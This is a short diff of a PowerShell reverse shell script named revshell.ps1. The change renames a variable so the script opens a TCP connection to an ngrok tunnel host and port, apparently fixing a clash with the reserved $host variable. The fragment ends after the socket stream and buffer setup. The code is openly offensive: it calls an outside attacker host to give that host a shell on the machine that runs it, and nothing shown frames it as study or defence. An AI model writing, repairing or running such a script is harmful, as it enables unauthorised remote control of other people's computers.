@@ -1,9 +1,9 @@
 # Reverse Shell Script (Windows) - Save as revshell.ps1
-$host = "10.tcp.eu.ngrok.io"
+$point = "10.tcp.eu.ngrok.io"
 $port = 29847
 
 try {
-    $client = New-Object System.Net.Sockets.TCPClient($host, $port)
+    $client = New-Object System.Net.Sockets.TCPClient($point, $port)
     $stream = $client.GetStream()
     $bytes  = New-Object byte[] 65536
     $enc    = [System.Text.Encoding]::ASCII
